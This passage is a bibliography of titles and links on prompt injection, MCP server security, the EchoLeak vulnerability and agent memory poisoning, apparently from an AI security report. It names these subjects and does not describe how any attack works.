> 23. How to Turn Off Grok: Steps to Stop Data Sharing and Important, [https://book.st-hakky.com/en/data-science/x-twitter-grok-opt-out-complete-guide](https://book.st-hakky.com/en/data-science/x-twitter-grok-opt-out-complete-guide)  
> 24. Prompt injection: the OWASP \#1 AI threat in 2026 \- Securance, [https://www.securance.com/blog/prompt-injection-the-owasp-1-ai-threat-in-2026/](https://www.securance.com/blog/prompt-injection-the-owasp-1-ai-threat-in-2026/)  
> 25. Prompt Injection Is the New SQL Injection: Why LLM Security Will, [https://www.researchgate.net/publication/401759269\_Prompt\_Injection\_Is\_the\_New\_SQL\_Injection\_Why\_LLM\_Security\_Will\_Define\_the\_Next\_Decade](https://www.researchgate.net/publication/401759269_Prompt_Injection_Is_the_New_SQL_Injection_Why_LLM_Security_Will_Define_the_Next_Decade)  
> 26. Prompt Injection as Role Confusion \- arXiv, [https://arxiv.org/html/2603.12277v3](https://arxiv.org/html/2603.12277v3)  
> 27. A Threat Model and Defense Architecturefor Prompt Injection in Multi, [https://arxiv.org/html/2609.22949v1](https://arxiv.org/html/2609.22949v1)  
> 28. The Comprehensive Guide to Prompt Injection Attacks in 2026 | Sysdig, [https://www.sysdig.com/learn-cloud-native/prompt-injection](https://www.sysdig.com/learn-cloud-native/prompt-injection)  
> 29. EchoLeak Zero-Click Data Exfiltration \- Promptfoo, [https://www.promptfoo.dev/lm-security-db/vuln/echoleak-zero-click-data-exfiltration-a87757e2/](https://www.promptfoo.dev/lm-security-db/vuln/echoleak-zero-click-data-exfiltration-a87757e2/)  
> 30. EchoLeak Vulnerability: CVE-2025-32711 Explained \- Reco AI, [https://www.reco.ai/blog/echoleak-vulnerability](https://www.reco.ai/blog/echoleak-vulnerability)  
> 31. EchoLeak and Indirect Prompt Injection: The Copilot Attack Surface, [https://sentra.io/blog/copilot-echoleak-prompt-injection](https://sentra.io/blog/copilot-echoleak-prompt-injection)  
> 32. Inside CVE-2025-32711 (EchoLeak): Prompt injection meets AI, [https://www.hackthebox.com/blog/cve-2025-32711-echoleak-copilot-vulnerability](https://www.hackthebox.com/blog/cve-2025-32711-echoleak-copilot-vulnerability)  
> 33. Prompt Injection Attack: How to Stop AI Exploits \- KELA Cyber, [https://www.kelacyber.com/blog/prompt-injection-attack/](https://www.kelacyber.com/blog/prompt-injection-attack/)  
> 34. OWASP MCP Top 10: Risks, CVEs & Defenses for 2026 \- Cycode, [https://cycode.com/blog/owasp-mcp-top-10/](https://cycode.com/blog/owasp-mcp-top-10/)  
> 35. Prompt Injection — The Complete Guide to Defending LLM, [https://automation4mi.com/en/guide-prompt-injection.html](https://automation4mi.com/en/guide-prompt-injection.html)  
> 36. Learn Agentic AI — AgentSwarms Curriculum, [https://agentswarms.fyi/learn](https://agentswarms.fyi/learn)  
> 37. Agent Memory Poisoning The Attack Waits \- Medium, [https://medium.com/@michael.hannecke/agent-memory-poisoning-the-attack-that-waits-9400f806fbd7](https://medium.com/@michael.hannecke/agent-memory-poisoning-the-attack-that-waits-9400f806fbd7)  
> 38. Prompt Injection Attacks on AI Agents: How to Detect and Prevent, [https://www.obsidiansecurity.com/blog/prompt-injection](https://www.obsidiansecurity.com/blog/prompt-injection)  
> 39. AI Security Timeline | CVEs, Breaches & Exploits in the AI Stack, [https://karanbansal.in/ai-security-timeline/](https://karanbansal.in/ai-security-timeline/)  
> 40. nkratk/llm-trust-guard \- GitHub, [https://github.com/nkratk/llm-trust-guard](https://github.com/nkratk/llm-trust-guard)  
> 41. Ramparts: security scanner for MCP servers and AI agent skills, [https://github.com/highflame-ai/ramparts](https://github.com/highflame-ai/ramparts)  
> 42. NMitchem/SkillScan: Security scanner for AI agent SKILL.md files, [https://github.com/NMitchem/SkillScan](https://github.com/NMitchem/SkillScan)  
> 43. Model Context Protocol Security \- Trail of Bits, [https://trailofbits.com/mcp/](https://trailofbits.com/mcp/)  
> 44. MCP Security Best Practices: The Complete 2026 Guide, [https://obot.ai/resources/learning-center/mcp-security/](https://obot.ai/resources/learning-center/mcp-security/)  
> 45. Demystifying Prompt Injection Attacks on Agentic AI Coding Editors, [https://arxiv.org/html/2509.22040v2](https://arxiv.org/html/2509.22040v2)  
> 46. CVE-2025-54135 \- CVE Record, [https://www.cve.org/CVERecord?id=CVE-2025-54135](https://www.cve.org/CVERecord?id=CVE-2025-54135)  
> 47. MCP Security Statistics 2026: CVEs, Vulnerabilities & Breach Data, [https://www.practical-devsecops.com/mcp-security-statistics-2026-report/](https://www.practical-devsecops.com/mcp-security-statistics-2026-report/)  
> 48. Prompt Injection Attacks: Techniques, Detection & Defense (2026), [https://cybersecurityswitzerland.com/encyclopedia/prompt-injection/](https://cybersecurityswitzerland.com/encyclopedia/prompt-injection/)  
> 49. NVD Vulnerability Search, [https://nvd.nist.gov/vuln/search?resultType=records\&cpeFilterMode=cpe\&cpeName=cpe:2.3:a:anthropic:claude\_code:1.0.83:\*:\*:\*:\*:node.js:\*:\*](https://nvd.nist.gov/vuln/search?resultType=records&cpeFilterMode=cpe&cpeName=cpe:2.3:a:anthropic:claude_code:1.0.83:*:*:*:*:node.js:*:*)  
> 50. CVE-2025-59536 Detail. \- NVD, [https://nvd.nist.gov/vuln/detail/CVE-2025-59536](https://nvd.nist.gov/vuln/detail/CVE-2025-59536)  
> 51. open-interpreter \- PyPI, [https://pypi.org/project/open-interpreter/](https://pypi.org/project/open-interpreter/)  
> 52. MCP Security Risks Every Developer Must Know in 2026 \- Levelop, [https://levelop.dev/blog/mcp-security-risks-developers-need-to-know](https://levelop.dev/blog/mcp-security-risks-developers-need-to-know)  
> 53. GitHub \- disler/agent-sandbox-skill, [https://github.com/disler/agent-sandbox-skill](https://github.com/disler/agent-sandbox-skill)  
> 54. jailbreak-defense · GitHub Topics, [https://github.com/topics/jailbreak-defense](https://github.com/topics/jailbreak-defense)  
> 55. Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a, [https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)  
> 56. MCP Security: Tool Poisoning, Line Jumping & Rug Pulls Explained, [https://lenshq.io/blog/mcp-security-tool-poisoning-threat-model/](https://lenshq.io/blog/mcp-security-tool-poisoning-threat-model/)  
> 57. The Lethal Trifecta: How Indirect Prompt Injection Is Breaking, [https://medium.com/@itpro677/the-lethal-trifecta-how-indirect-prompt-injection-is-breaking-agentic-ai-and-what-security-teams-c2ecba874ed1](https://medium.com/@itpro677/the-lethal-trifecta-how-indirect-prompt-injection-is-breaking-agentic-ai-and-what-security-teams-c2ecba874ed1)  
> 58. The Best MCP Gateway Options for GitHub MCP Server, [https://mcpmanager.ai/blog/mcp-gateway-github-server/](https://mcpmanager.ai/blog/mcp-gateway-github-server/)